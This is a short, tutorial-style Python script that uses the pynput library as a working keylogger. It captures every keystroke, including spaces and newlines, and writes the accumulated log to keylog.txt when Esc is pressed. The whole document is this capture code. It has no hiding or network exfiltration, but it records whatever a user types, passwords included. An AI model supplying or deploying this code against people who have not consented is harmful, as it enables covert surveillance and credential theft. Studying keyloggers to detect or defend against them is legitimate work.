from pynput.keyboard import Key, Listener

# Initialize a string to store the captured keystrokes
log = ""


# Define the on_press function to capture each keystroke
def key_press(key):
    global log  # Access the global log variable
    try:
        # Attempt to append the character representation of the key to the log
        log += str(key.char)
    except AttributeError:
        # Handle special keys (e.g., space, enter, etc.) that don't have a char attribute
        if key == Key.space:
            log += ' '  # Add a space character for the space key
        elif key == Key.enter:
            log += '\n'  # Add a newline character for the enter key
        else:
            # Handle other special keys as needed (commented out)
            # log += ' ' + str(key) + ' '
            pass


# Define the on_release function to stop logging when the escape key is pressed
def key_release(key):
    if key == Key.esc:
        # Write the log to a file before exiting
        with open("keylog.txt", "w") as f:
            f.write(log)
        return False  # Returning False stops the listener


# Set up the listener
with Listener(on_press=key_press, on_release=key_release) as listener:
    listener.join()  # Start the listener and wait for it to finish
